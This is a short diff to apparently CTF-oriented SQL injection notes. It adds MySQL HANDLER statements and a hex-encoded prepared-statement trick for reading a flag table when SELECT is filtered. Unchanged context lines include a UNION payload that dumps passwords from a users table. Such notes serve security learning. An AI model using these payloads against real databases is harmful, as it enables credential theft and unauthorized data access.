@@ -20,8 +20,11 @@ SQLite
 ```' UNION SELECT 1,group_concat(password) FROM users-- -```
 
 
+# Use Handler de thuc thi cau lenh
 
-Use preparestatement to execute query 
+HANDLER demo OPEN; HANDLER demo READ FIRST, HANDLER demo READ NEXT, HANDLER demo CLOSE:
+
+# Use preparestatement to execute query 
 
 "select flag from \`1919810931114514\`" => 73656c65637420666c61672066726f6d20603139313938313039333131313435313460
 
